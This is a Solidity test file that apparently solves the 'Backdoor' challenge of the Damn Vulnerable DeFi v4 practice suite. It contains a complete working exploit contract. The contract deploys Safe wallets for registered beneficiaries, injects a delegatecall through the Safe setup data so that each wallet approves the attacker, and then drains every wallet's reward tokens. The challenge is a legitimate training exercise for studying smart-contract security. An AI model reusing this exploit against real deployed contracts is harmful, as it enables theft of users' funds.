// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [
        makeAddr("alice"),
        makeAddr("bob"),
        makeAddr("charlie"),
        makeAddr("david")
    ];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(singletonCopy),
            address(walletFactory),
            address(token),
            users
        );

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(
            token.balanceOf(address(walletRegistry)),
            AMOUNT_TOKENS_DISTRIBUTED
        );
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        // console.logBytes4(singletonCopy.setup.selector);
        /* walletFactory.createProxyWithCallback(
            address(singletonCopy),
            data,
            0,
            walletRegistry
        );*/
        Backdoor backdoor = new Backdoor(
            users,
            address(singletonCopy),
            address(walletFactory),
            address(token),
            address(walletRegistry),
            address(recovery)
        );
        backdoor.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract Backdoor {
    address[] users;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    DamnValuableToken token;
    WalletRegistry walletRegistry;
    address recovery;

    constructor(
        address[] memory _users,
        address _singletonCopy,
        address _walletFactory,
        address _token,
        address _walletRegistry,
        address _recovery
    ) {
        users = _users;
        singletonCopy = Safe(payable(_singletonCopy));
        walletFactory = SafeProxyFactory(_walletFactory);
        token = DamnValuableToken(_token);
        walletRegistry = WalletRegistry(_walletRegistry);
        recovery = _recovery;
    }

    function fakeapprove(
        address _token,
        address _recovery,
        uint256 _amount
    ) external {
        DamnValuableToken(_token).approve(_recovery, _amount);
    }

    function attack() external {
        for (uint i = 0; i < users.length; i++) {
            address[] memory _owners = new address[](1);
            _owners[0] = users[i];
            bytes memory Module_call_data = abi.encodeWithSignature(
                "fakeapprove(address,address,uint256)",
                address(token),
                address(this),
                10 ether
            );
            bytes memory test_call = abi.encodeWithSelector(
                singletonCopy.setup.selector,
                _owners,
                1,
                address(this),
                Module_call_data,
                address(0),
                address(0),
                0,
                address(0)
            );
            walletFactory.createProxyWithCallback(
                address(singletonCopy),
                test_call,
                0,
                walletRegistry
            );
            address generated_proxy = walletRegistry.wallets(users[i]);
            console.log(token.balanceOf(generated_proxy));
            console.log(token.allowance(generated_proxy, address(this)));
            // console.log(generated_proxy);
            token.transferFrom(generated_proxy, address(this), 10 ether);
            token.transfer(recovery, 10 ether);
        }
    }
}
